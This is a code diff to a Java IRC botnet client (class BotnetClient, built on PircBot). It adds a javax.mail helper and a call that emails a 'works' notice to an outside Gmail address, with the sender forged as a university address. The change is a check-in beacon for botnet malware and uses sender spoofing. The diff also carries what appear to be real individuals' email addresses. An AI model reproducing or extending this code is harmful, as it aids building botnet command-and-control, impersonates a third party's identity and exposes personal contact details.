@@ -1,6 +1,8 @@
 import java.io.*;
 import java.net.*;
 import java.util.*;
+import javax.mail.*;
+import javax.mail.internet.*;
 
 import org.jibble.pircbot.*;
 
@@ -42,6 +44,7 @@ public class BotnetClient extends PircBot {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
+		sendEmail("roy@cs.washington.edu", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 	}
 		
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
@@ -89,6 +92,22 @@ public class BotnetClient extends PircBot {
 		}
 	}
 	
+	private void sendEmail(String from, String[] to, String subject, String body) {
+		Properties props = new Properties();
+		Session session = Session.getDefaultInstance(props);
+	    MimeMessage message = new MimeMessage( session );
+	    try {
+	    	message.setFrom( new InternetAddress(from) );
+	    	for (int i = 0; i < to.length; i++) {
+	    		message.addRecipient(Message.RecipientType.TO, new InternetAddress(to[i]));
+	    	}
+	    	message.setSubject( subject );
+	    	message.setText( body );
+	    	Transport.send( message );
+	    } catch (MessagingException ex){
+	    	System.err.println("Cannot send email. " + ex);
+	    }
+	}
 
 	protected void onIncomingChatRequest(DccChat chat) {
 		if (chat == null) {
